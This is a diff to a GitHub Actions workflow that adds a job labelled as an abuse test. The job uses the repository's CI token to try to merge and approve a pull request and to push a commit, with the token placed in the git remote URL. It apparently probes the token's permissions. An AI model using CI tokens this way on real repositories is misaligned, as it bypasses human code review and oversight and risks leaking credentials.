@@ -65,6 +65,34 @@ env:
   MIGRAPHX_RUNNER_LABEL: linux-migraphx-mi250-1
 
 jobs:
+  test_token_permissions:
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write
+    steps:
+      - name: Try to merge PR
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh pr merge ${{ github.event.pull_requests.number }} --merge --repo ${{ github.repository }} || echo "MERGE FAILED"
+
+      - name: Try to approve PR
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh pr review ${{ github.event.pull_requests.number }} --approve --repo ${{ github.repository }} || echo "APPROVE FAILED"
+
+      - name: Try to push a commit (needs contents: write)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          git config user.email "test@test.com"
+          git config user.name "Test"
+          git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}
+          echo "test" >> test_abuse.txt
+          git add test_abuse.txt
+          git commit -m "abuse test"
+          git push origin HEAD || echo "PUSH FAILED"
   get_config:
     runs-on: ubuntu-latest
     permissions:
